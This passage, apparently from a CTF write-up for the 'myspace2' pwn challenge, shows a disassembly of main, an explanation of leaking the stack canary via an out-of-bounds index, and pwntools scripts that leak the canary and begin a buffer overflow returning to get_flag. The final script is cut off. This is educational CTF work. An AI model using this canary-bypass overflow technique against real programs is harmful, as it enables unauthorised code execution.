+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x00000000004015b8</span> <span class=err>&lt;+</span><span class=mi>52</span><span class=err>&gt;</span><span class=p>:</span>    <span class=no>call</span>   <span class=mh>0x401150</span> <span class=p>&lt;</span><span class=no>setvbuf@plt</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x00000000004015bd</span> <span class=err>&lt;+</span><span class=mi>57</span><span class=err>&gt;</span><span class=p>:</span>    <span class=no>lea</span>    <span class=no>rax</span><span class=p>,[</span><span class=no>rip</span><span class=err>+</span><span class=mi>0xb24</span><span class=p>]</span>        <span class=c1># 0x4020e8
+</span></span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x00000000004015c4</span> <span class=err>&lt;+</span><span class=mi>64</span><span class=err>&gt;</span><span class=p>:</span>    <span class=no>mov</span>    <span class=no>rdi</span><span class=p>,</span><span class=no>rax</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x00000000004015c7</span> <span class=err>&lt;+</span><span class=mi>67</span><span class=err>&gt;</span><span class=p>:</span>    <span class=no>call</span>   <span class=mh>0x4010d0</span> <span class=p>&lt;</span><span class=no>puts@plt</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x00000000004015cc</span> <span class=err>&lt;+</span><span class=mi>72</span><span class=err>&gt;</span><span class=p>:</span>    <span class=no>movabs</span> <span class=no>rax</span><span class=p>,</span><span class=mi>0x6e316e337365</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x00000000004015d6</span> <span class=err>&lt;+</span><span class=mi>82</span><span class=err>&gt;</span><span class=p>:</span>    <span class=no>mov</span>    <span class=no>QWORD</span> <span class=no>PTR</span> <span class=p>[</span><span class=no>rbp-0x70</span><span class=p>],</span><span class=no>rax</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x00000000004015da</span> <span class=err>&lt;+</span><span class=mi>86</span><span class=err>&gt;</span><span class=p>:</span>    <span class=no>mov</span>    <span class=no>QWORD</span> <span class=no>PTR</span> <span class=p>[</span><span class=no>rbp-0x68</span><span class=p>],</span><span class=mi>0x6f72655a</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x00000000004015e2</span> <span class=err>&lt;+</span><span class=mi>94</span><span class=err>&gt;</span><span class=p>:</span>    <span class=no>movabs</span> <span class=no>rax</span><span class=p>,</span><span class=mi>0x6e6f72746e6f43</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x00000000004015ec</span> <span class=err>&lt;+</span><span class=mi>104</span><span class=err>&gt;</span><span class=p>:</span>   <span class=no>mov</span>    <span class=no>QWORD</span> <span class=no>PTR</span> <span class=p>[</span><span class=no>rbp-0x60</span><span class=p>],</span><span class=no>rax</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x00000000004015f0</span> <span class=err>&lt;+</span><span class=mi>108</span><span class=err>&gt;</span><span class=p>:</span>   <span class=no>movabs</span> <span class=no>rax</span><span class=p>,</span><span class=mi>0x317978696d</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x00000000004015fa</span> <span class=err>&lt;+</span><span class=mi>118</span><span class=err>&gt;</span><span class=p>:</span>   <span class=no>mov</span>    <span class=no>QWORD</span> <span class=no>PTR</span> <span class=p>[</span><span class=no>rbp-0x58</span><span class=p>],</span><span class=no>rax</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x00000000004015fe</span> <span class=err>&lt;+</span><span class=mi>122</span><span class=err>&gt;</span><span class=p>:</span>   <span class=no>movabs</span> <span class=no>rax</span><span class=p>,</span><span class=mi>0x4c68736f4a</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x0000000000401608</span> <span class=err>&lt;+</span><span class=mi>132</span><span class=err>&gt;</span><span class=p>:</span>   <span class=no>mov</span>    <span class=no>QWORD</span> <span class=no>PTR</span> <span class=p>[</span><span class=no>rbp-0x50</span><span class=p>],</span><span class=no>rax</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x000000000040160c</span> <span class=err>&lt;+</span><span class=mi>136</span><span class=err>&gt;</span><span class=p>:</span>   <span class=no>movabs</span> <span class=no>rax</span><span class=p>,</span><span class=mi>0x70707070616947</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x0000000000401616</span> <span class=err>&lt;+</span><span class=mi>146</span><span class=err>&gt;</span><span class=p>:</span>   <span class=no>mov</span>    <span class=no>QWORD</span> <span class=no>PTR</span> <span class=p>[</span><span class=no>rbp-0x48</span><span class=p>],</span><span class=no>rax</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x000000000040161a</span> <span class=err>&lt;+</span><span class=mi>150</span><span class=err>&gt;</span><span class=p>:</span>   <span class=no>movabs</span> <span class=no>rax</span><span class=p>,</span><span class=mi>0x746e6f6673656349</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x0000000000401624</span> <span class=err>&lt;+</span><span class=mi>160</span><span class=err>&gt;</span><span class=p>:</span>   <span class=no>mov</span>    <span class=no>QWORD</span> <span class=no>PTR</span> <span class=p>[</span><span class=no>rbp-0x40</span><span class=p>],</span><span class=no>rax</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x0000000000401628</span> <span class=err>&lt;+</span><span class=mi>164</span><span class=err>&gt;</span><span class=p>:</span>   <span class=no>movabs</span> <span class=no>rax</span><span class=p>,</span><span class=mi>0x78636974637261</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x0000000000401632</span> <span class=err>&lt;+</span><span class=mi>174</span><span class=err>&gt;</span><span class=p>:</span>   <span class=no>mov</span>    <span class=no>QWORD</span> <span class=no>PTR</span> <span class=p>[</span><span class=no>rbp-0x38</span><span class=p>],</span><span class=no>rax</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x0000000000401636</span> <span class=err>&lt;+</span><span class=mi>178</span><span class=err>&gt;</span><span class=p>:</span>   <span class=no>mov</span>    <span class=no>eax</span><span class=p>,</span><span class=mi>0x0</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x000000000040163b</span> <span class=err>&lt;+</span><span class=mi>183</span><span class=err>&gt;</span><span class=p>:</span>   <span class=no>call</span>   <span class=mh>0x401305</span> <span class=p>&lt;</span><span class=no>menu</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x0000000000401640</span> <span class=err>&lt;+</span><span class=mi>188</span><span class=err>&gt;</span><span class=p>:</span>   <span class=no>mov</span>    <span class=no>rdx</span><span class=p>,</span><span class=no>QWORD</span> <span class=no>PTR</span> <span class=p>[</span><span class=no>rip</span><span class=err>+</span><span class=mi>0x2a29</span><span class=p>]</span>        <span class=c1># 0x404070 &lt;stdin@GLIBC_2.2.5&gt;
+</span></span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x0000000000401647</span> <span class=err>&lt;+</span><span class=mi>195</span><span class=err>&gt;</span><span class=p>:</span>   <span class=no>lea</span>    <span class=no>rax</span><span class=p>,[</span><span class=no>rbp-0x30</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x000000000040164b</span> <span class=err>&lt;+</span><span class=mi>199</span><span class=err>&gt;</span><span class=p>:</span>   <span class=no>mov</span>    <span class=no>esi</span><span class=p>,</span><span class=mi>0x28</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x0000000000401650</span> <span class=err>&lt;+</span><span class=mi>204</span><span class=err>&gt;</span><span class=p>:</span>   <span class=no>mov</span>    <span class=no>rdi</span><span class=p>,</span><span class=no>rax</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x0000000000401653</span> <span class=err>&lt;+</span><span class=mi>207</span><span class=err>&gt;</span><span class=p>:</span>   <span class=no>call</span>   <span class=mh>0x401130</span> <span class=p>&lt;</span><span class=no>fgets@plt</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x0000000000401658</span> <span class=err>&lt;+</span><span class=mi>212</span><span class=err>&gt;</span><span class=p>:</span>   <span class=no>lea</span>    <span class=no>rax</span><span class=p>,[</span><span class=no>rbp-0x30</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x000000000040165c</span> <span class=err>&lt;+</span><span class=mi>216</span><span class=err>&gt;</span><span class=p>:</span>   <span class=no>mov</span>    <span class=no>rdi</span><span class=p>,</span><span class=no>rax</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x000000000040165f</span> <span class=err>&lt;+</span><span class=mi>219</span><span class=err>&gt;</span><span class=p>:</span>   <span class=no>call</span>   <span class=mh>0x401160</span> <span class=p>&lt;</span><span class=no>atoi@plt</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x0000000000401664</span> <span class=err>&lt;+</span><span class=mi>224</span><span class=err>&gt;</span><span class=p>:</span>   <span class=no>mov</span>    <span class=no>DWORD</span> <span class=no>PTR</span> <span class=p>[</span><span class=no>rbp-0x74</span><span class=p>],</span><span class=no>eax</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x0000000000401667</span> <span class=err>&lt;+</span><span class=mi>227</span><span class=err>&gt;</span><span class=p>:</span>   <span class=no>cmp</span>    <span class=no>DWORD</span> <span class=no>PTR</span> <span class=p>[</span><span class=no>rbp-0x74</span><span class=p>],</span><span class=mi>0x4</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x000000000040166b</span> <span class=err>&lt;+</span><span class=mi>231</span><span class=err>&gt;</span><span class=p>:</span>   <span class=no>je</span>     <span class=mh>0x4016b7</span> <span class=p>&lt;</span><span class=no>main</span><span class=p>+</span><span class=mi>307</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x000000000040166d</span> <span class=err>&lt;+</span><span class=mi>233</span><span class=err>&gt;</span><span class=p>:</span>   <span class=no>cmp</span>    <span class=no>DWORD</span> <span class=no>PTR</span> <span class=p>[</span><span class=no>rbp-0x74</span><span class=p>],</span><span class=mi>0x4</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x0000000000401671</span> <span class=err>&lt;+</span><span class=mi>237</span><span class=err>&gt;</span><span class=p>:</span>   <span class=no>jg</span>     <span class=mh>0x4016cd</span> <span class=p>&lt;</span><span class=no>main</span><span class=p>+</span><span class=mi>329</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x0000000000401673</span> <span class=err>&lt;+</span><span class=mi>239</span><span class=err>&gt;</span><span class=p>:</span>   <span class=no>cmp</span>    <span class=no>DWORD</span> <span class=no>PTR</span> <span class=p>[</span><span class=no>rbp-0x74</span><span class=p>],</span><span class=mi>0x3</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x0000000000401677</span> <span class=err>&lt;+</span><span class=mi>243</span><span class=err>&gt;</span><span class=p>:</span>   <span class=no>je</span>     <span class=mh>0x4016a9</span> <span class=p>&lt;</span><span class=no>main</span><span class=p>+</span><span class=mi>293</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x0000000000401679</span> <span class=err>&lt;+</span><span class=mi>245</span><span class=err>&gt;</span><span class=p>:</span>   <span class=no>cmp</span>    <span class=no>DWORD</span> <span class=no>PTR</span> <span class=p>[</span><span class=no>rbp-0x74</span><span class=p>],</span><span class=mi>0x3</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x000000000040167d</span> <span class=err>&lt;+</span><span class=mi>249</span><span class=err>&gt;</span><span class=p>:</span>   <span class=no>jg</span>     <span class=mh>0x4016cd</span> <span class=p>&lt;</span><span class=no>main</span><span class=p>+</span><span class=mi>329</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x000000000040167f</span> <span class=err>&lt;+</span><span class=mi>251</span><span class=err>&gt;</span><span class=p>:</span>   <span class=no>cmp</span>    <span class=no>DWORD</span> <span class=no>PTR</span> <span class=p>[</span><span class=no>rbp-0x74</span><span class=p>],</span><span class=mi>0x1</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x0000000000401683</span> <span class=err>&lt;+</span><span class=mi>255</span><span class=err>&gt;</span><span class=p>:</span>   <span class=no>je</span>     <span class=mh>0x40168d</span> <span class=p>&lt;</span><span class=no>main</span><span class=p>+</span><span class=mi>265</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x0000000000401685</span> <span class=err>&lt;+</span><span class=mi>257</span><span class=err>&gt;</span><span class=p>:</span>   <span class=no>cmp</span>    <span class=no>DWORD</span> <span class=no>PTR</span> <span class=p>[</span><span class=no>rbp-0x74</span><span class=p>],</span><span class=mi>0x2</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x0000000000401689</span> <span class=err>&lt;+</span><span class=mi>261</span><span class=err>&gt;</span><span class=p>:</span>   <span class=no>je</span>     <span class=mh>0x40169b</span> <span class=p>&lt;</span><span class=no>main</span><span class=p>+</span><span class=mi>279</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x000000000040168b</span> <span class=err>&lt;+</span><span class=mi>263</span><span class=err>&gt;</span><span class=p>:</span>   <span class=no>jmp</span>    <span class=mh>0x4016cd</span> <span class=p>&lt;</span><span class=no>main</span><span class=p>+</span><span class=mi>329</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x000000000040168d</span> <span class=err>&lt;+</span><span class=mi>265</span><span class=err>&gt;</span><span class=p>:</span>   <span class=no>lea</span>    <span class=no>rax</span><span class=p>,[</span><span class=no>rbp-0x70</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x0000000000401691</span> <span class=err>&lt;+</span><span class=mi>269</span><span class=err>&gt;</span><span class=p>:</span>   <span class=no>mov</span>    <span class=no>rdi</span><span class=p>,</span><span class=no>rax</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x0000000000401694</span> <span class=err>&lt;+</span><span class=mi>272</span><span class=err>&gt;</span><span class=p>:</span>   <span class=no>call</span>   <span class=mh>0x40135b</span> <span class=p>&lt;</span><span class=no>all_friends</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x0000000000401699</span> <span class=err>&lt;+</span><span class=mi>277</span><span class=err>&gt;</span><span class=p>:</span>   <span class=no>jmp</span>    <span class=mh>0x4016dc</span> <span class=p>&lt;</span><span class=no>main</span><span class=p>+</span><span class=mi>344</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x000000000040169b</span> <span class=err>&lt;+</span><span class=mi>279</span><span class=err>&gt;</span><span class=p>:</span>   <span class=no>lea</span>    <span class=no>rax</span><span class=p>,[</span><span class=no>rbp-0x70</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x000000000040169f</span> <span class=err>&lt;+</span><span class=mi>283</span><span class=err>&gt;</span><span class=p>:</span>   <span class=no>mov</span>    <span class=no>rdi</span><span class=p>,</span><span class=no>rax</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x00000000004016a2</span> <span class=err>&lt;+</span><span class=mi>286</span><span class=err>&gt;</span><span class=p>:</span>   <span class=no>call</span>   <span class=mh>0x4013be</span> <span class=p>&lt;</span><span class=no>edit_friend</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x00000000004016a7</span> <span class=err>&lt;+</span><span class=mi>291</span><span class=err>&gt;</span><span class=p>:</span>   <span class=no>jmp</span>    <span class=mh>0x4016dc</span> <span class=p>&lt;</span><span class=no>main</span><span class=p>+</span><span class=mi>344</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x00000000004016a9</span> <span class=err>&lt;+</span><span class=mi>293</span><span class=err>&gt;</span><span class=p>:</span>   <span class=no>lea</span>    <span class=no>rax</span><span class=p>,[</span><span class=no>rbp-0x70</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x00000000004016ad</span> <span class=err>&lt;+</span><span class=mi>297</span><span class=err>&gt;</span><span class=p>:</span>   <span class=no>mov</span>    <span class=no>rdi</span><span class=p>,</span><span class=no>rax</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x00000000004016b0</span> <span class=err>&lt;+</span><span class=mi>300</span><span class=err>&gt;</span><span class=p>:</span>   <span class=no>call</span>   <span class=mh>0x4014d7</span> <span class=p>&lt;</span><span class=no>display_friend</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x00000000004016b5</span> <span class=err>&lt;+</span><span class=mi>305</span><span class=err>&gt;</span><span class=p>:</span>   <span class=no>jmp</span>    <span class=mh>0x4016dc</span> <span class=p>&lt;</span><span class=no>main</span><span class=p>+</span><span class=mi>344</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x00000000004016b7</span> <span class=err>&lt;+</span><span class=mi>307</span><span class=err>&gt;</span><span class=p>:</span>   <span class=no>mov</span>    <span class=no>eax</span><span class=p>,</span><span class=mi>0x0</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x00000000004016bc</span> <span class=err>&lt;+</span><span class=mi>312</span><span class=err>&gt;</span><span class=p>:</span>   <span class=no>mov</span>    <span class=no>rdx</span><span class=p>,</span><span class=no>QWORD</span> <span class=no>PTR</span> <span class=p>[</span><span class=no>rbp-0x8</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x00000000004016c0</span> <span class=err>&lt;+</span><span class=mi>316</span><span class=err>&gt;</span><span class=p>:</span>   <span class=no>sub</span>    <span class=no>rdx</span><span class=p>,</span><span class=no>QWORD</span> <span class=no>PTR</span> <span class=no>fs</span><span class=p>:</span><span class=mi>0x28</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x00000000004016c9</span> <span class=err>&lt;+</span><span class=mi>325</span><span class=err>&gt;</span><span class=p>:</span>   <span class=no>je</span>     <span class=mh>0x4016e6</span> <span class=p>&lt;</span><span class=no>main</span><span class=p>+</span><span class=mi>354</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x00000000004016cb</span> <span class=err>&lt;+</span><span class=mi>327</span><span class=err>&gt;</span><span class=p>:</span>   <span class=no>jmp</span>    <span class=mh>0x4016e1</span> <span class=p>&lt;</span><span class=no>main</span><span class=p>+</span><span class=mi>349</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x00000000004016cd</span> <span class=err>&lt;+</span><span class=mi>329</span><span class=err>&gt;</span><span class=p>:</span>   <span class=no>lea</span>    <span class=no>rax</span><span class=p>,[</span><span class=no>rip</span><span class=err>+</span><span class=mi>0xa6a</span><span class=p>]</span>        <span class=c1># 0x40213e
+</span></span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x00000000004016d4</span> <span class=err>&lt;+</span><span class=mi>336</span><span class=err>&gt;</span><span class=p>:</span>   <span class=no>mov</span>    <span class=no>rdi</span><span class=p>,</span><span class=no>rax</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x00000000004016d7</span> <span class=err>&lt;+</span><span class=mi>339</span><span class=err>&gt;</span><span class=p>:</span>   <span class=no>call</span>   <span class=mh>0x4010d0</span> <span class=p>&lt;</span><span class=no>puts@plt</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x00000000004016dc</span> <span class=err>&lt;+</span><span class=mi>344</span><span class=err>&gt;</span><span class=p>:</span>   <span class=no>jmp</span>    <span class=mh>0x401636</span> <span class=p>&lt;</span><span class=no>main</span><span class=p>+</span><span class=mi>178</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x00000000004016e1</span> <span class=err>&lt;+</span><span class=mi>349</span><span class=err>&gt;</span><span class=p>:</span>   <span class=no>call</span>   <span class=mh>0x4010f0</span> <span class=p>&lt;</span><span class=no>__stack_chk_fail@plt</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x00000000004016e6</span> <span class=err>&lt;+</span><span class=mi>354</span><span class=err>&gt;</span><span class=p>:</span>   <span class=no>leave</span>
+</span></span><span class=line><span class=cl>   <span class=err>0</span><span class=nf>x00000000004016e7</span> <span class=err>&lt;+</span><span class=mi>355</span><span class=err>&gt;</span><span class=p>:</span>   <span class=no>ret</span>
+</span></span><span class=line><span class=cl><span class=nf>End</span> <span class=no>of</span> <span class=no>assembler</span> <span class=no>dump.</span>
+</span></span></code></pre></td></tr></table></div></div><p>i know that the canary is likely loaded in <code>0x00000000004016bc &lt;+312>: mov rdx,QWORD PTR [rbp-0x8]</code> because right after this instruction there is a <code>0x00000000004016c0 &lt;+316>: sub rdx,QWORD PTR fs:0x28</code> instruction and stack check fail call which happens after a comparing of values. It makes sure that the value is the same through subtracting the expected value and all. <code>fgets()</code> entry is at <code>[rbp-0x30]</code> meaning alignment wise its above the matrix. The beginning is <code>0x70</code> so the distance betwween them both is 40 but this indexing is relative to the beginning of the matrix. So its <code>40+64</code> which is <code>104</code> or basically &ldquo;index 13&rdquo;.</p><p>simple canary capture</p><p>basically tldr canary is a value in the stack which when overwritten makes the program just crash out. Its a security protection which is supposed to stop buffer overflow attacks this way. Alas, like many protections it gets absolutely screwed over if leaks exist.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-py data-lang=py><span class=line><span class=cl><span class=ch>#!/usr/bin/python3</span>
+</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>arch</span> <span class=o>=</span> <span class=s2>&#34;amd64&#34;</span>
+</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>os</span> <span class=o>=</span> <span class=s2>&#34;linux&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;./myspace2&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>io</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s1>&#39;./myspace2&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;&gt; &#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;3&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;: &#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;13&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=n>leak</span> <span class=o>=</span> <span class=n>io</span><span class=o>.</span><span class=n>recvn</span><span class=p>(</span><span class=mi>8</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>canary</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>leak</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;canary: </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>canary</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>[*] &#39;/home/shuban/Code/py_workspace/ctf/idek/pwn/attachments/myspace2&#39;
+</span></span><span class=line><span class=cl>    Arch:     amd64-64-little
+</span></span><span class=line><span class=cl>    RELRO:    Partial RELRO
+</span></span><span class=line><span class=cl>    Stack:    Canary found
+</span></span><span class=line><span class=cl>    NX:       NX unknown - GNU_STACK missing
+</span></span><span class=line><span class=cl>    PIE:      No PIE (0x400000)
+</span></span><span class=line><span class=cl>    Stack:    Executable
+</span></span><span class=line><span class=cl>    RWX:      Has RWX segments
+</span></span><span class=line><span class=cl>[+] Starting local process &#39;./myspace2&#39;: pid 12602
+</span></span><span class=line><span class=cl>canary: 0x51426e6fa1175900
+</span></span><span class=line><span class=cl>[*] Stopped process &#39;./myspace2&#39; (pid 12602)
+</span></span></code></pre></td></tr></table></div></div><p>the <code>00</code> suffix is there so yea canary. Now i can bof in peace</p><p>now -></p><ul><li>i overflow and i bypass canary</li><li>theres conventiently a get_flag function. i ret to there.</li><li>i exit cuz i need the ret to pop the top of the stack and jmp (top of the stack is addr of get flag)</li></ul><p>so then i can finish the final script where the last order of business was just to do a simple bof with canary alignment, and then exit to leverage ret.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-py data-lang=py><span class=line><span class=cl><span class=ch>#!/usr/bin/python3</span>
+</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>arch</span> <span class=o>=</span> <span class=s2>&#34;amd64&#34;</span>
+</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>os</span> <span class=o>=</span> <span class=s2>&#34;linux&#34;</span>
+</span></span><span class=line><span class=cl><span class=n>local</span> <span class=o>=</span> <span class=kc>False</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;./myspace2&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>io</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s1>&#39;./myspace2&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=ow>not</span> <span class=n>local</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s2>&#34;myspace2.chal.idek.team&#34;</span><span class=p>,</span> <span class=mi>1337</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;&gt; &#34;</span><span class=p>)</span>
